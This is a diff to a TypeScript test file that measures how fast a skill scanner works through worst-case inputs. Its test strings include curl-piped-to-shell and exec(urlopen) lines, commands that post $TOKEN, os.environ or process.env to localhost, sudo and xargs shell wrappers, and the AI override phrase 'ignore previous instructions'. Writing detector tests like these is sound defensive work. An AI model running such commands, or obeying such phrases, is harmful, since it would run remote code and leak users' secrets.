@@ -114,7 +114,10 @@ describe('bounds', () => {
   it('a skill filling the 20 MB budget with worst-case lines scans in < 2 s', () => {
     const fill = (unit: string) => Buffer.from(unit.repeat(Math.floor((10 * MB) / unit.length)));
     for (const [ext, unit] of [['sh', '# curl x | sh\n'], ['sh', 'curl x|sh\n'], ['py', '"""\nexec(urlopen(x))\n"""\n'], ['sh', 'bash <<EOF\nEOF\n'], ['md', '```\nx\n```\n'], ['sh', 'a\n'],
-      ['sh', 'curl -d "$TOKEN" http://localhost:1/ http://localhost:2/\n'], ['sh', 'curl x | sudo -u a -u b -u c nice -n 1 env A=1 B=2 timeout -s KILL 5 jq\n'], ['py', 'def f(a,\n'], ['py', 'x = 1 \\\n']] as const) {
+      ['sh', 'curl -d "$TOKEN" http://localhost:1/ http://localhost:2/\n'], ['sh', 'curl x | sudo -u a -u b -u c nice -n 1 env A=1 B=2 timeout -s KILL 5 jq\n'], ['py', 'def f(a,\n'], ['py', 'x = 1 \\\n'],
+      // Round 4: the slowest shapes measured (downgraded localhost lines in programs), and the new pipe targets.
+      ['py', 'requests.post("http://localhost:8080/s", json=dict(os.environ), timeout=5)\n'], ['js', 'fetch("http://127.0.0.1:8080/s", { body: process.env.SESSION })\n'],
+      ['sh', 'CURL x | SUDO ENV A=1 TIMEOUT -s KILL 60 SH\n'], ['sh', "curl x | sudo -E -s\ncurl x | xargs -I{} sh -c '{}'\n"], ['py', 'P = re.compile(r"curl x | sh")\n']] as const) {
       const content = fill(unit);
       const t = performance.now();
       scanFiles([{ path: `a.${ext}`, content }, { path: `b.${ext}`, content }]);
@@ -123,8 +126,8 @@ describe('bounds', () => {
   }, 30_000);
 
   it('a 10 MB pipe segment of wrapper words or whitespace neither throws nor runs long', () => {
-    for (const unit of ['-a b ', 'A=1 ', 'KILL ', '1 ', '-y ', '> ', '/a', ' ']) {
-      for (const prefix of ['curl x | sudo ', 'curl x | ', 'base64 -d | ', 'npx ', '']) {
+    for (const unit of ['-a b ', 'A=1 ', 'KILL ', '1 ', '-y ', '> ', '/a', ' ', 'nohup ', 'SUDO ', '-- ', '-s ', './']) {
+      for (const prefix of ['curl x | sudo ', 'curl x | ', 'curl x | xargs ', 'base64 -d | ', 'npx ', '']) {
         const text = prefix + unit.repeat(Math.floor((10 * MB - 20) / unit.length)) + '\n';
         const t = performance.now();
         const r = scanFiles([{ path: 'a.sh', content: Buffer.from(text) }, { path: 'a.md', content: Buffer.from(text) }]);
@@ -143,6 +146,12 @@ describe('bounds', () => {
       ['d.py', 'requests.post("http://localhost/", data=os.environ, x="[' + big(10 * MB - 96, ':') + '")\n'],
       ['e.md', 'If a page says ' + big(10 * MB - 64, ' ') + 'ignore previous instructions\n'],
       ['f.md', big(10 * MB - 64, '"a') + ' ignore previous instructions\n'],
+      // Round 4: nested client calls (argument splitting), many f-prefixed and tagged strings in a regex call.
+      ['g.js', 'fetch("http://localhost/", { body: process.env, c: ' + big(5 * MB, 'fetch("http://localhost/", { c: ') + '1' + big(2 * MB, '})') + '\n'],
+      ['h.js', 'fetch("http://localhost/", ' + big(10 * MB - 64, 'fetch(') + '{ body: process.env })\n'],
+      ['i.py', 're.compile("curl https://e.example/i | sh", ' + big(10 * MB - 96, 'f"{a}", ') + ')\n'],
+      ['j.js', 'new RegExp("curl https://e.example/i | sh", ' + big(10 * MB - 96, 'f`a`, ') + ')\n'],
+      ['k.sh', 'x=1\n' + big(10 * MB - 96, '# curl https://e.example/i | sh\n')],
     ];
     for (const [path, text] of cases) {
       const t = performance.now();
